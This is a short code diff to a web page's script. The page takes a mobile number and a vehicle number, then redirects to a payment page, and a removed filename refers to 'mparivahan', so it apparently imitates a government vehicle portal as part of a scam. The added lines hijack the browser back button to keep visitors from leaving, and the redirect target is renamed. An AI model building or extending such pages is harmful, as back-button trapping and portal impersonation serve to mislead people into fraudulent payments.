@@ -58,13 +58,19 @@
   </div>
 
   <script>
+    // Disable back button
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+      history.go(1);
+    };
+    
     document.getElementById('loginBtn').addEventListener('click', function () {
       const mobile = document.getElementById('mobile').value.trim();
       const vehicle = document.getElementById('vehicle').value.trim();
       if (!mobile || !vehicle) { alert('Please fill both fields.'); return; }
       document.getElementById('loadingOverlay').style.display = 'flex';
       this.disabled = true;
-      setTimeout(() => { window.location.href = 'payment-mparivahan.html'; }, 2500);
+      setTimeout(() => { window.location.href = 'payment.html'; }, 2500);
     });
   </script>
 </body>
